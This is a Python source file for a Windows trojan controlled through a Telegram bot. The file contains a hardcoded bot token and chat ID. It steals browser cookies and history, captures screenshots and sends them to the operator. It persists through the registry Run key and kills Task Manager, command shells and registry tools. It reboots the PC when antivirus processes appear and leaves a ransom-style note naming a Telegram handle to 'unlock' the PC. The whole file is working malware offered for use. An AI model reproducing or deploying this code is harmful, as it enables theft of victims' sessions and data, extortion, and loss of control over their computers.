import os
import sys
import time
import ctypes
import threading
import sqlite3
import zipfile
import shutil
import getpass
import datetime
import telebot
from telebot import types
from PIL import ImageGrab
import psutil
import winreg as reg
import winsound
from pathlib import Path


BOT_TOKEN = "8193770040:AAEEYBTsnC1pb1E_1k3nXKSKkxRuPEBX-Pk"  
ADMIN_CHAT_ID = "7814388821"  


ZIP_FOLDER = "collected_data"
SCREENSHOT_PATH = os.path.join(ZIP_FOLDER, "screenshot.png")
COOKIES_PATH = os.path.join(ZIP_FOLDER, "cookies.txt")
HISTORY_PATH = os.path.join(ZIP_FOLDER, "history.txt")
LOG_PATH = os.path.join(ZIP_FOLDER, "log.txt")
WALLPAPER_DIR = os.path.join(ZIP_FOLDER, "wallpapers")
MUSIC_DIR = os.path.join(ZIP_FOLDER, "music")


CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Cookies" % os.environ['USERPROFILE'])
EDGE_PATH = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Default\Cookies" % os.environ['USERPROFILE'])
FIREFOX_PATH = os.path.normpath(r"%s\AppData\Roaming\Mozilla\Firefox\Profiles" % os.environ['USERPROFILE'])


BLOCKED_PROCESSES = [
    "taskmgr", "processhacker", "simplelocker", "cmd", "regedit",
    "powershell", "msconfig", "resmon", "notepad", "procexp"
]

ANTIVIRUS_KEYWORDS = [
    "avast", "avg", "kaspersky", "drweb", "bitdefender",
    "norton", "mcafee", "eset", "malwarebytes"
]


TIMER_DURATION = 600  
CURRENT_WALLPAPER = None
CURRENT_MUSIC = None


WARNING_MESSAGE = """Good afternoon user if you read this file, then you downloaded Trojan

----------------
rules 
--------------

1 Upon trying to open the antivirus, fuck PC is demolished

2 blocked as 

Task Manager, Process Hacker Simple a Locker
Win+R, Ctrl+Alt+Del, Alt+F4, CMD.exe
---------------------

To unlock your PC write @uspminorov

--------------------

I wish you good luck
"""


bot = telebot.TeleBot(BOT_TOKEN)


def init_db():
    conn = sqlite3.connect("system_info.db")
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS system_info (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            os_info TEXT,
            timestamp TEXT
        )
    ''')
    conn.commit()
    conn.close()


def collect_system_info():
    if not os.path.exists(ZIP_FOLDER):
        os.makedirs(ZIP_FOLDER)

    username = getpass.getuser()
    os_info = os.name
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    
    conn = sqlite3.connect("system_info.db")
    c = conn.cursor()
    c.execute("INSERT INTO system_info (username, os_info, timestamp) VALUES (?, ?, ?)",
              (username, os_info, timestamp))
    conn.commit()
    conn.close()

    
    with open(LOG_PATH, "w", encoding="utf-8") as f:
        f.write(f"Имя пользователя: {username}\nОС: {os_info}\nВремя сбора: {timestamp}")


def take_screenshot():
    img = ImageGrab.grab()
    img.save(SCREENSHOT_PATH)


def extract_cookies():
    def read_sqlite_db(path, query):
        try:
            conn = sqlite3.connect(path)
            cursor = conn.cursor()
            cursor.execute(query)
            return cursor.fetchall()
        except Exception as e:
            print(f"Ошибка чтения куков из {path}: {e}")
            return []

    all_cookies = []

    
    if os.path.exists(CHROME_PATH):
        cookies = read_sqlite_db(CHROME_PATH, "SELECT host_key, name, value FROM cookies")
        for host, name, value in cookies:
            all_cookies.append(f"Chrome | {host} | {name} = {value}")

    
    if os.path.exists(EDGE_PATH):
        cookies = read_sqlite_db(EDGE_PATH, "SELECT host_key, name, value FROM cookies")
        for host, name, value in cookies:
            all_cookies.append(f"Edge | {host} | {name} = {value}")

    
    if os.path.exists(FIREFOX_PATH):
        profiles = os.listdir(FIREFOX_PATH)
        for profile in profiles:
            profile_path = os.path.join(FIREFOX_PATH, profile)
            if os.path.isdir(profile_path) and "default-release" in profile.lower():
                firefox_cookie_path = os.path.join(profile_path, "cookies.sqlite")
                if os.path.exists(firefox_cookie_path):
                    cookies = read_sqlite_db(firefox_cookie_path, "SELECT host, name, value FROM moz_cookies")
                    for host, name, value in cookies:
                        all_cookies.append(f"Firefox | {host} | {name} = {value}")

    
    with open(COOKIES_PATH, "w", encoding="utf-8") as f:
        f.write("\n".join(all_cookies))


def extract_browser_history():
    history_lines = []

    # Chrome
    chrome_history_path = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\History" % os.environ['USERPROFILE'])
    if os.path.exists(chrome_history_path):
        conn = sqlite3.connect(chrome_history_path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
        for row in cursor.fetchall():
            history_lines.append(f"Chrome | {row[0]} | {row[1]}")

    # Edge
    edge_history_path = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Default\History" % os.environ['USERPROFILE'])
    if os.path.exists(edge_history_path):
        conn = sqlite3.connect(edge_history_path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
        for row in cursor.fetchall():
            history_lines.append(f"Edge | {row[0]} | {row[1]}")

    
    if os.path.exists(FIREFOX_PATH):
        profiles = os.listdir(FIREFOX_PATH)
        for profile in profiles:
            profile_path = os.path.join(FIREFOX_PATH, profile)
            if os.path.isdir(profile_path) and "default-release" in profile.lower():
                firefox_places_path = os.path.join(profile_path, "places.sqlite")
                if os.path.exists(firefox_places_path):
                    conn = sqlite3.connect(firefox_places_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title FROM moz_places WHERE visit_count > 0 ORDER BY last_visit_date DESC LIMIT 50")
                    for row in cursor.fetchall():
                        history_lines.append(f"Firefox | {row[0]} | {row[1]}")

    
    with open(HISTORY_PATH, "w", encoding="utf-8") as f:
        f.write("\n".join(history_lines))


def zip_folder():
    zip_name = f"data_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.zip"
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        for foldername, subfolders, filenames in os.walk(ZIP_FOLDER):
            for filename in filenames:
                file_path = os.path.join(foldername, filename)
                zipf.write(file_path, arcname=os.path.relpath(file_path, ZIP_FOLDER))
    return zip_name


def create_warning_file():
    desktop = Path.home() / "Desktop"
    file_path = os.path.join(desktop, "minorov.txt")
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(WARNING_MESSAGE)
    print("[+] Файл minorov.txt создан на рабочем столе.")


def add_to_startup():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        app_path = os.path.realpath(sys.argv[0])
        reg.SetValueEx(key, "SystemMonitor", 0, reg.REG_SZ, app_path)
        reg.CloseKey(key)
    except Exception as e:
        print("Ошибка добавления в автозагрузку:", e)


def hide_console_window():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)


def protect_process():
    PROCESS_TERMINATE = 0x0001
    GetCurrentProcess = ctypes.windll.kernel32.GetCurrentProcess
    OpenProcessToken = ctypes.windll.advapi32.OpenProcessToken
    LookupPrivilegeValue = ctypes.windll.advapi32.LookupPrivilegeValueW
    AdjustTokenPrivileges = ctypes.windll.advapi32.AdjustTokenPrivileges

    hProcess = GetCurrentProcess()
    hToken = ctypes.c_void_p()
    luid = ctypes.c_ulong()
    tkp = ctypes.Structure
    class LUID(ctypes.Structure):
        _fields_ = [("LowPart", ctypes.c_ulong), ("HighPart", ctypes.c_long)]
    class TOKEN_PRIVILEGES(ctypes.Structure):
        _fields_ = [("PrivilegeCount", ctypes.c_ulong),
                    ("Luid", LUID),
                    ("Attributes", ctypes.c_ulong)]

    OpenProcessToken(hProcess, 0x20 | 0x8, ctypes.byref(hToken))
    LookupPrivilegeValue(None, b"SeDebugPrivilege", ctypes.byref(luid))
    tp = TOKEN_PRIVILEGES()
    tp.PrivilegeCount = 1
    tp.Luid = luid
    tp.Attributes = 0x00000002
    AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), ctypes.sizeof(tp), None, None)


def block_processes():
    while True:
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                proc_name = proc.info['name'].lower()
                for keyword in BLOCKED_PROCESSES:
                    if keyword in proc_name:
                        print(f"[!] Заблокирован процесс: {proc.info['name']}")
                        proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        time.sleep(5)


def is_antivirus_running():
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            proc_name = proc.info['name'].lower()
            for keyword in ANTIVIRUS_KEYWORDS:
                if keyword in proc_name:
                    print(f"[!] Обнаружен процесс: {proc.info['name']}")
                    return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    return False

def monitor_processes():
    while True:
        if is_antivirus_running():
            print("[+] Перезагрузка системы...")
            os.system("shutdown /r /t 0")
        time.sleep(5)


def change_wallpaper(wallpaper_path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)


def start_timer(duration, wallpaper=None, music=None):
    global CURRENT_WALLPAPER, CURRENT_MUSIC
    CURRENT_WALLPAPER = wallpaper
    CURRENT_MUSIC = music
    print(f"[+] Таймер запущен на {duration // 60} минут.")
    time.sleep(duration)
    if wallpaper:
        change_wallpaper(wallpaper)
    if music:
        winsound.PlaySound(music, winsound.SND_FILENAME | winsound.SND_ASYNC)


def block_shortcuts():
    try:
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        reg.SetValueEx(key, "disabletaskmgr", 0, reg.REG_DWORD, 1)
        reg.SetValueEx(key, "NoDispCPL", 0, reg.REG_DWORD, 1)
        reg.SetValueEx(key, "NoSMHelp", 0, reg.REG_DWORD, 1)
        reg.SetValueEx(key, "NoWinKeys", 0, reg.REG_DWORD, 1)
        reg.CloseKey(key)
    except Exception as e:
        print("Ошибка блокировки:", e)


def generate_admin_keyboard():
    keyboard = types.InlineKeyboardMarkup()
    keyboard.row(
        types.InlineKeyboardButton("📸 Сделать скриншот", callback_data="screenshot"),
        types.InlineKeyboardButton("🍪 Собрать куки", callback_data="cookies")
    )
    keyboard.row(
        types.InlineKeyboardButton("🔍 История браузера", callback_data="history"),
        types.InlineKeyboardButton("📦 Собрать всё в ZIP", callback_data="collect_all")
    )
    keyboard.row(
        types.InlineKeyboardButton("🗑 Очистить временные файлы", callback_data="clean"),
        types.InlineKeyboardButton("📄 Посмотреть лог", callback_data="view_log")
    )
    keyboard.row(
        types.InlineKeyboardButton("🛑 Выключить ПК", callback_data="shutdown"),
        types.InlineKeyboardButton("📊 Информация о системе", callback_data="status")
    )
    keyboard.row(types.InlineKeyboardButton("⏰ Установить таймер", callback_data="set_timer"))
    return keyboard


@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id == ADMIN_CHAT_ID:
        bot.send_message(message.chat.id, "Админ-панель запущена.", reply_markup=generate_admin_keyboard())


@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.message.chat.id != ADMIN_CHAT_ID:
        return

    if call.data == "screenshot":
        take_screenshot()
        with open(SCREENSHOT_PATH, "rb") as photo:
            bot.send_photo(call.message.chat.id, photo, caption="Скриншот экрана")
        bot.answer_callback_query(call.id, "Скриншот сделан!")

    elif call.data == "cookies":
        extract_cookies()
        with open(COOKIES_PATH, "rb") as f:
            bot.send_document(call.message.chat.id, f, caption="Файл с куками")
        bot.answer_callback_query(call.id, "Куки собраны!")

    elif call.data == "history":
        extract_browser_history()
        with open(HISTORY_PATH, "rb") as f:
            bot.send_document(call.message.chat.id, f, caption="История браузера")
        bot.answer_callback_query(call.id, "История собрана!")

    elif call.data == "collect_all":
        collect_system_info()
        take_screenshot()
        extract_cookies()
        extract_browser_history()
        zip_file = zip_folder()
        with open(zip_file, 'rb') as f:
            bot.send_document(call.message.chat.id, f, caption=f"Данные от {getpass.getuser()}")
        os.remove(zip_file)
        bot.answer_callback_query(call.id, "Все данные собраны и отправлены!")

    elif call.data == "clean":
        if os.path.exists(ZIP_FOLDER):
            shutil.rmtree(ZIP_FOLDER)
            os.makedirs(ZIP_FOLDER)
        bot.answer_callback_query(call.id, "Временные файлы очищены!")

    elif call.data == "view_log":
        if os.path.exists(LOG_PATH):
            with open(LOG_PATH, "rb") as f:
                bot.send_document(call.message.chat.id, f, caption="Лог системы")
        else:
            bot.send_message(call.message.chat.id, "Лог не найден.")
        bot.answer_callback_query(call.id, "Лог отправлен!")

    elif call.data == "shutdown":
        os.system("shutdown /s /t 1")
        bot.send_message(call.message.chat.id, "ПК будет выключен через 1 минуту.")
        bot.answer_callback_query(call.id, "Выключение начато!")

    elif call.data == "status":
        collect_system_info()
        with open(LOG_PATH, "r", encoding="utf-8") as f:
            log_text = f.read()
        bot.send_message(call.message.chat.id, f"Текущая информация:\n\n{log_text}")
        bot.answer_callback_query(call.id, "Статус отправлен!")

    elif call.data == "set_timer":
        bot.send_message(call.message.chat.id, "Введите длительность таймера в секундах:")
        bot.register_next_step_handler(call.message, process_timer_duration)

def process_timer_duration(message):
    try:
        duration = int(message.text)
        bot.send_message(message.chat.id, "Загрузите обложку для таймера (изображение):")
        bot.register_next_step_handler(message, lambda m: process_wallpaper(m, duration))
    except:
        bot.send_message(message.chat.id, "Неправильный формат.")

def process_wallpaper(message, duration):
    if message.photo:
        file_id = message.photo[-1].file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        wallpaper_path = os.path.join(WALLPAPER_DIR, "custom_wallpaper.jpg")
        with open(wallpaper_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.send_message(message.chat.id, "Загрузите музыку для таймера:")
        bot.register_next_step_handler(message, lambda m: process_music(m, duration, wallpaper_path))
    else:
        bot.send_message(message.chat.id, "Обложка не загружена.")

def process_music(message, duration, wallpaper_path):
    if message.audio:
        file_id = message.audio.file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        music_path = os.path.join(MUSIC_DIR, "custom_music.wav")
        with open(music_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.send_message(message.chat.id, f"Таймер установлен на {duration} секунд.")
        timer_thread = threading.Thread(target=start_timer, args=(duration, wallpaper_path, music_path))
        timer_thread.start()
    else:
        bot.send_message(message.chat.id, "Музыка не загружена.")


def main():
    create_warning_file()
    init_db()
    add_to_startup()
    hide_console_window()
    protect_process()
    block_shortcuts()

    if not os.path.exists(WALLPAPER_DIR):
        os.makedirs(WALLPAPER_DIR)
    if not os.path.exists(MUSIC_DIR):
        os.makedirs(MUSIC_DIR)

    
    protection_thread = threading.Thread(target=block_processes)
    protection_thread.daemon = True
    protection_thread.start()

    
    monitor_thread = threading.Thread(target=monitor_processes)
    monitor_thread.daemon = True
    monitor_thread.start()

    
    bot.polling()

if __name__ == "__main__":
    main()